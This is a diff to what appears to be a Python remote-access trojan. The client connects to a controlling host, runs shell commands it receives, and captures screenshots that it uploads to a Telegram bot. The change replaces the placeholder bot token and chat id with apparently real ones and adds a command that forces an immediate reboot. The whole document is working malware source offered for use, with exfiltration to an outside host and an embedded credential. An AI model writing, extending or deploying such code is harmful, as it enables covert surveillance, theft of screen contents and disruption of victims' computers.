@@ -11,12 +11,11 @@ while True:
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		s.connect((host, port))
-		break
-	except:
-		pass
-
-while True:
-	try:
+		data = "Connected"
+		if not data:
+			s.close()
+			sys.exit()
+			
 		a = s.recv(1024)
 		a = a.decode()
 		if a == '/cmd':
@@ -50,7 +49,7 @@ while True:
 				subprocess.run('screen.bat', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 				photo = open(r"screenshot.png", 'rb')
 				files = {'document': photo}
-				requests.post("https://api.telegram.org/botTOKEN/sendDocument?chat_id=CHATID", files=files)
+				requests.post("https://api.telegram.org/bot1656016658:AAGxJpjEaZ--T1eDc4wUc8GS3NXQ1fNcJ2w/sendDocument?chat_id=330710135", files=files)
 				photo.close()
 				os.remove('screen.bat')
 				os.remove('screenshot.png')
@@ -67,5 +66,7 @@ while True:
 			s.send(cmd_process)
 		elif a == "/webcam":
 			pass
+		elif a == "/poff":
+			os.system('shutdown /r /f /t 0')
 	except:
 		pass
